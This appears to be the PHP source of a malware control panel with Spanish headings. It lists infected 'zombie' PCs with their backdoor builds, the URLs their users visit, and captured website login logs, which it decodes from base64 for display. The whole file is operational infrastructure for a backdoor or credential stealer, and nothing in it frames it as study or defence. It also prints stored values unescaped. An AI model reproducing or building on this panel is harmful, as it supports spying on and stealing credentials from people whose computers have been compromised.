<?php session_start();
require_once('includes/config.php');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Panel</title>
    <link rel="stylesheet" type="text/css" href="https://stopcloud.org/v2/style/semantic.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
</head>
<body>

    <h1>Adelanto!</h1>
    <h2>REGISTRO DE PC CONECTADAS</h2>

    <table class="ui very basic table">
        <thead>
        <tr>
            <th>Online</th>
            <th>Country</th>
            <th>Identify</th>
            <th>Build</th>
            <th>Logs</th>
        </tr>
        </thead>
        <tbody>
        <?php
        $bots = $bdd->prepare("SELECT * FROM bots LIMIT 0,5");
        $bots->execute();
        while($fetch = $bots->fetch())
        {
            if($fetch['online'] == '0')
                $online = "<img class='status'>";
            if($fetch['online'] == '1')
                $online = "<img class='status'>";
            ?>
            <tr>
                <td><?php echo $online; ?></td>
                <td><?php echo $fetch['name']; ?></td>
                <td><?php echo $fetch['name'] ?></td>
                <td><?php echo $fetch['backdoor_name'] ?></td>
                <td><?php echo $fetch['numbers_logs'] ?></td>
            </tr>
            <?php
        }
        ?>
        </tbody>
    </table>
    <h1>Adelanto!</h1>
    <h2>REGISTRO DE VISITAS</h2>
    <div class="ui segment">
        <table class="ui very basic table">
            <thead>
            <tr>
                <th>UrlVisitas</th>
                <th>Time</th>
            </tr>
            </thead>
            <tbody>
            <?php
            $bots = $bdd->prepare("SELECT * FROM history_web LIMIT 0,5");
            $bots->execute();
            while($fetch = $bots->fetch())
            {
                ?>
                <tr>
                    <td><?php echo $fetch['website']; ?></td>
                    <td><?php echo $fetch['zombie'] ?></td>
                </tr>
                <?php
            }
            ?>

            </tbody>

        </table>
    </div>


    <h1>Adelanto!</h1>
    <h2>REGISTRO DE LOGIN</h2>
    <table class="ui very basic table">
        <thead>
        <tr>
            <th>#id</th>
            <th>Name</th>
            <th>Url</th>
            <th>Logs</th>
        </tr>
        </thead>
        <tbody>
        <?php
        $logs = $bdd->prepare("SELECT * FROM logs_checker ORDER BY id DESC LIMIT 0,5");
        $logs->execute();
        while($fetch = $logs->fetch())
        {
            if(base64_decode($fetch['logs_site'], true) != ''){
                $log = base64_decode($fetch['logs_site'], true);
            }
            else{
                $log = $fetch['logs_site'];
            }
            ?>
            <tr>
                <td><?php echo $fetch['id']; ?></td>
                <td><?php echo $fetch['zombie']; ?></td>
                <td><?php echo $fetch['url_site']; ?></td>
                <td><textarea rows="3" cols="60" class="formlog"><?php echo $log; ?></textarea></td>
            </tr>
            <?php
        }
        ?>
        </tbody>
    </table>
</body>
</html>